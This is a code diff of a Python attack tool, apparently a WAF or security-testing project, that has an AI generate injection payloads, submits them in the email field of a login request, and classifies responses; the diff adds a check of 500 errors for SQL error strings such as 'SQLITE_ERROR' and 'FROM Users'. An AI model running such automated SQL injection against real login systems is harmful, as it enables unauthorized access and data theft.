@@ -18,7 +18,7 @@ def main(same_payload):
     ai_reply = None
 
     while True:
-
+        print("=====攻撃側操作=====")
         print("1：攻撃ペイロード生成\n"
               "2：生成したペイロードで攻撃\n"
               "3：攻撃側操作終了\n")
@@ -39,9 +39,6 @@ def main(same_payload):
                     if b in["Y","y","yes"]:
                         ai_reply = generate_payload(logs)
                         print(ai_reply)
-
-                
-
             case "2":
                 c = input("※すでに攻撃済みの場合のみ※\n前回と同じ攻撃ペイロードを使用しますか？(y/n):")
                 #直近で生成したペイロードと一度生成したペイロードのどちらも存在しない場合
@@ -95,13 +92,11 @@ def generate_payload(logs):
                 # ai_reply = red_cloud_ai.payload_ganerate(logs) #クラウドAI使用
                 return ai_reply
             except:
-                print(f"{i}回目の再試行処理が失敗...")
+                print(f"{i+1}回目の再試行処理が失敗...")
 
         print("再試行でもエラーが発生したため処理を中断します...")
         return None
 
-        
-    
 #攻撃用ペイロード
 def payload_p(ai_reply):
     logs = []
@@ -111,7 +106,7 @@ def payload_p(ai_reply):
     email_payloads = ai_reply 
     pass_payloads = "aaa"
     for i in email_payloads:
-        print(f"\n実行中[email]:{i}---" )
+        print(f"\n実行中[email]:{i}" )
         payload = {
                     "email":i,
                     "password":pass_payloads
@@ -138,6 +133,7 @@ def payload_p(ai_reply):
             logs.append(recode) #logs配列に入れる
             print(f"インジェクション攻撃が成功しました:status_code:{response.status_code}")
         elif response.status_code == 500:
+            analyze = analyze_500error(response.text)
             #WAFにブロックされず通過した場合ここで攻撃を記録
             recode = {
                 "ペイロード": i,
@@ -146,7 +142,7 @@ def payload_p(ai_reply):
                 "攻撃結果":False,
             }
             logs.append(recode) #logs配列に入れる
-            print(f"脆弱性の検出に成功:status_code:{response.status_code}")
+            print(f"{analyze}:status_code:{response.status_code}")
         else:
             recode = {
                 "ペイロード": i,
@@ -166,6 +162,23 @@ def payload_p(ai_reply):
             print(f"攻撃ログ：{i}\n")
 
     return logs
+
+#ステータスコードが500の場合、脆弱性の発見かサーバーエラーかを判定する
+def analyze_500error(res_text):
+    
+    vulnerability = [
+        "SQLITE_ERROR",
+        "SequelizeDatabaseError",
+        "syntax error",
+        "SELECT",
+        "FROM Users", 
+    ]
+
+    for i in vulnerability:
+        if i in res_text:
+            return "脆弱性の兆候あり"
+        
+    return "サーバーエラー(詳細不明)"
 
 #ユーザーデータ取得
 def token_p(token):
